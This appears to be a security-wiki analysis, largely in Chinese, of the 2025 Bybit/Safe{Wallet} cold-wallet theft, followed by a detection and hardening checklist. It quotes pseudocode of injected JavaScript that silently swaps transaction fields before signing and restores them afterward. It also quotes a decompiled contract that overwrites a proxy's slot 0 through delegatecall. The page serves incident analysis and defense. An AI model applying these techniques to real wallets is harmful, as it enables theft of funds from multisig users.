# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## 概述

一次冷钱包盗窃攻击链将 **Safe{Wallet} Web UI 的 supply-chain compromise** 与 **通过链上 delegatecall primitive 覆写 proxy 的 implementation pointer（slot 0）** 相结合。关键要点如下：

- 如果 dApp 能够向 signing path 注入代码，就可以让 signer 生成一份针对攻击者指定字段的有效 **EIP-712 signature**<sup>[[4]](#references)</sup>，同时恢复原始 UI 数据，使其他 signer 毫无察觉。
- Safe proxy 将 `masterCopy`（implementation）存储在 **storage slot 0** 中。对一个会写入 slot 0 的 contract 执行 delegatecall，实际上会将 Safe “升级”为攻击者控制的 logic，从而完全控制该 wallet。

## Off-chain：Safe{Wallet} 中的定向 signing mutation

被篡改的 Safe bundle（`_app-*.js`）有选择地攻击特定的 Safe + signer addresses。注入的 logic 在 signing call 之前立即执行：<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### 攻击特性
- **Context-gated**：针对受害者 Safe/签名者的硬编码 allowlist 减少了噪声并降低了被检测到的概率。<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**：在 `signTransaction` 之前立即覆写字段（`to`、`data`、`operation`、gas），随后再恢复，因此 UI 中的 proposal payload 看起来无害，而签名却与攻击者 payload 相匹配。
- **EIP-712 opacity**：wallet 会显示结构化数据，但不会解码嵌套 calldata，也不会突出显示 `operation = delegatecall`，因此被 mutation 的消息实际上是在盲签。

### Gateway validation relevance
Safe proposals 会提交到 **Safe Client Gateway**。<sup>[[5]](#references)</sup> 在强化检查之前，如果 UI 在签名后重写字段，gateway 可能会接受 `safeTxHash`/signature 与 JSON body 中不同字段相对应的 proposal。事件发生后，gateway 现在会拒绝 hash/signature 与所提交 transaction 不匹配的 proposals。任何 signing-orchestration API 也应实施类似的 server-side hash verification。

### 2025 Bybit/Safe incident highlights
- 2025 年 2 月 21 日的 Bybit 冷钱包被盗事件（约 401k ETH）复用了相同模式：被 compromise 的 Safe S3 bundle 仅对 Bybit signers 触发，并将 `operation=0` 替换为 `1`，将 `to` 指向一个预先部署的 attacker contract，该合约会写入 slot 0。<sup>[[1]](#references)[[3]](#references)</sup>
- Wayback 缓存的 `_app-52c9031bfa03da47.js` 显示，该逻辑以 Bybit 的 Safe（`0x1db9…cf4`）和 signer addresses 为触发条件，并在执行两分钟后立即恢复为干净的 bundle，与“mutate → sign → restore”技巧一致。<sup>[[1]](#references)[[2]](#references)</sup>
- 恶意 contract（例如 `0x9622…c7242`）包含简单的 `sweepETH/sweepERC20` 函数，以及一个会写入 implementation slot 的 `transfer(address,uint256)`。执行 `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` 后，proxy implementation 被替换，攻击者获得完全控制权。<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain：通过 slot collision 接管 Delegatecall proxy

Safe proxies 将 `masterCopy` 保存在 **storage slot 0**，并将所有逻辑 delegate 给它。由于 Safe 支持 **`operation = 1`（delegatecall）**，任何已签名的 transaction 都可以指向任意 contract，并在 proxy 的 storage context 中执行其代码。<sup>[[3]](#references)</sup>

攻击者 contract 模仿 ERC-20 的 `transfer(address,uint256)`，但实际却将 `_to` 写入 slot 0：<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
执行路径：<sup>[[1]](#references)[[3]](#references)</sup>
1. 受害者使用 `operation = delegatecall`、`to = attackerContract`、`data = transfer(newImpl, 0)` 对 `execTransaction` 进行签名。
2. Safe masterCopy 会验证针对这些参数的签名。
3. Proxy 通过 delegatecall 进入 `attackerContract`；`transfer` 函数体写入 slot 0。
4. Slot 0（`masterCopy`）现在指向攻击者控制的逻辑合约 → **完全接管钱包并转走资金**。

### Guard 与版本说明（事件后的加固措施）
- Safes >= v1.3.0 可以安装 **Guard**，以否决 `delegatecall` 或对 `to`/selectors 强制执行 ACL；Bybit 使用的是 v1.1.1，因此不存在 Guard hook。必须升级合约（并重新添加 owners）才能获得这一控制平面。

## 检测与加固检查清单

- **UI 完整性**：固定 JS assets / SRI；监控 bundle 差异；将签名 UI 视为信任边界的一部分。
- **签名时验证**：使用支持 **EIP-712 clear-signing** 的硬件钱包；明确显示 `operation` 并解码嵌套 calldata。当 `operation = 1` 时，除非策略允许，否则拒绝签名。
- **服务端 hash 检查**：中继 proposals 的 gateways/services 必须重新计算 `safeTxHash`，并验证签名与提交的字段匹配。
- **策略/allowlists**：针对 `to`、selectors、asset types 制定 preflight 规则；除经过审查的流程外，禁止 delegatecall。在广播完全签名的交易前，要求经过内部 policy service。
- **合约设计**：除非确有严格必要，否则避免在 multisig/treasury wallets 中暴露任意 delegatecall。将 upgrade pointers 放置在 slot 0 之外，或使用显式的 upgrade logic 和 access control 进行保护。
- **监控**：当持有 treasury funds 的 wallets 执行 delegatecall 时发出警报；当 proposals 将 `operation` 从常见的 `call` 模式修改为其他值时发出警报。

## 参考资料

- [1] [AnChain.AI 对 Bybit Safe exploit 的取证分析](https://www.anchain.ai/blog/bybit)
- [2] [Zero Hour Technology 对 Safe bundle compromise 的分析](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Bybit hack 深度技术分析（NCC Group）](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway（GitHub）](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
